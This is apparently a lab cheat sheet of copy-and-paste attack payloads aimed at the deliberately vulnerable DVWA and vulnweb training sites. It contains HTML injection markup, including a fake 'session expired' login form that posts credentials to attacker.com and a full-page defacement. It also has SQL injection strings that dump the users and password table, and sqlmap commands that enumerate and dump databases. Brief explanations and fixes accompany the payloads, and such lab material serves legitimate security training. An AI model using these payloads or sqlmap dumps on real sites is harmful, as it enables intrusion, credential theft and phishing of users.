# PAYLOADS — copy & paste

All payloads are harmless demo values. Run them only against DVWA / vulnweb.

---

## A. HTML Injection — DVWA → **XSS (Reflected)**

Paste into the *"What's your name?"* box, click **Submit**.

### A1. Reflection test (identification)
```
A
```
> Page replies "Hello A" → input is echoed back → possible injection.

### A2. Does it parse HTML?
```html
<h1>test</h1>
```

### A3. Visible proof (scrolling text)
```html
<marquee>Hacked</marquee>
```

### A4. Load an external image (attacker-hosted content)
```html
<img src="https://miro.medium.com/max/400/0*y2OAF_DSarBAjihO.jpg">
```

### A5. Injected link (phishing)
```html
<a href="http://example.com">Click here to claim your prize</a>
```

### A6. Embedded iframe
```html
<iframe src="http://example.com" width="600" height="400"></iframe>
```

### A7. Fake login form — the "so what" of the lab
```html
<form action="http://attacker.com/steal.php">
<h2>Session expired. Please log in again.</h2>
<input name="user" placeholder="Username">
<input name="pass" type="password" placeholder="Password">
<input type="submit" value="Login">
</form>
```

### A8. Full-page defacement
```html
<body style="background:#000;color:#0f0;font-family:monospace">
<h1>DEFACED</h1><p>HTML injection works.</p></body>
```

**Why it works:** the input is inserted into the HTML response **without output encoding**,
so the browser renders it as markup instead of showing it as text.

**HTML injection vs XSS**
| | HTML injection | XSS |
|---|---|---|
| Injects | HTML tags | JavaScript |
| Impact | defacement, fake forms, embedded content | cookie/session theft, keylogging |
| Fix | output encoding | output encoding + CSP + HttpOnly |

---

## B. SQL Injection — DVWA → **SQL Injection**

Paste into the ID box, click **Submit**.

| Payload | Result |
|---|---|
| `1` | One normal record |
| `1'` | **SQL syntax error** → proves injectable |
| `1' OR '1'='1` | Returns **every** user |
| `' OR 1=1 #` | Same, `#` comments out the rest |
| `' UNION SELECT user, password FROM users #` | Dumps DVWA credentials table |
| `' UNION SELECT version(), database() #` | DB version + DB name |
| `' UNION SELECT table_name, table_schema FROM information_schema.tables #` | Enumerates tables |

**How it works**
1. `'` closes the string literal in the query → breaks the SQL.
2. `OR 1=1` makes the WHERE clause always true → all rows returned.
3. `#` (or `-- `) comments out the remainder of the original query.
4. `UNION SELECT` appends a second result set → arbitrary data in the output.

---

## C. sqlmap — remote target

```bash
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --dbs
```
```bash
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart --tables
```
```bash
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart -T users --columns
```
```bash
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart -T users --dump
```

Prompt answers when asked manually:

| Prompt | Key |
|---|---|
| skip payloads for other DBMSes | **Y** |
| extend tests for MySQL | **N** |
| keep testing other parameters | **N** |
| store hashes to temp file | **N** |
| crack via dictionary | **N** |

Add `--batch` to skip all prompts.

---

## D. sqlmap — local DVWA

```bash
sqlmap -u "http://localhost/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=<PASTE>; security=low" --dbs --batch
```
```bash
sqlmap -u "http://localhost/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=<PASTE>; security=low" -D dvwa -T users -C user,password --dump --batch
```

Useful flags:

| Flag | Meaning |
|---|---|
| `--batch` | never ask, use defaults |
| `--cookie` | authenticated session (required by DVWA) |
| `--dbs` / `--tables` / `--columns` / `--dump` | enumerate DB / tables / columns / rows |
| `-D` `-T` `-C` | database / table / column selector |
| `--level=5 --risk=3` | more (aggressive) tests |
| `--threads=10` | faster |
| `--random-agent` | randomise User-Agent |
| `--output-dir` | where logs and CSVs are saved |
| `-v 3` | show the injected payloads |
